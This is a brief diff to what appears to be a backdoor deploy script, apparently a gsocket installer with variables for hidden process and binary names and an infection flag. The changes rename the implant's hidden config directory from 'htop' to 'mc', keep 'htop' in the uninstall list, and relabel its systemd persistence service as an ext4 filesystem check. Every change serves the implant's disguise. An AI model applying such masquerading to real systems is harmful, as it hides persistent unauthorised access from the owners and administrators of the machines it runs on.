@@ -150,7 +150,7 @@ PROC_HIDDEN_NAME_RX="${PROC_HIDDEN_NAME_RX:1}"
 
 # PROC_HIDDEN_NAME_DEFAULT="[rcu_preempt]"
 # ~/.config/<NAME>
-CONFIG_DIR_NAME="htop"
+CONFIG_DIR_NAME="mc"
 
 GS_INFECT=1
 [[ -n $GS_NOINFECT ]] && unset GS_INFECT
@@ -180,7 +180,7 @@ res=$(command -v cron) && {
 
 # Names for 'uninstall' (including names from previous versions)
 BIN_HIDDEN_NAME_RM=("$BIN_HIDDEN_NAME_DEFAULT" "gs-dbus" "gs-db")
-CONFIG_DIR_NAME_RM=("$CONFIG_DIR_NAME" "dbus")
+CONFIG_DIR_NAME_RM=("$CONFIG_DIR_NAME" "htop" "dbus")
 
 [[ -t 1 ]] && {
 	CY="\033[1;33m" # yellow
@@ -1345,7 +1345,7 @@ install_systemd_new() {
 	mk_file "${SERVICE_FILE}" || return 255
 	chmod 644 "${SERVICE_FILE}" # Stop 'is marked world-inaccessible' dmesg warnings.
 	echo "[Unit]
-Description=D-Bus System Connection Bus
+Description=Offline ext4 Metadata Check for All Filesystems
 After=network.target
 
 [Service]
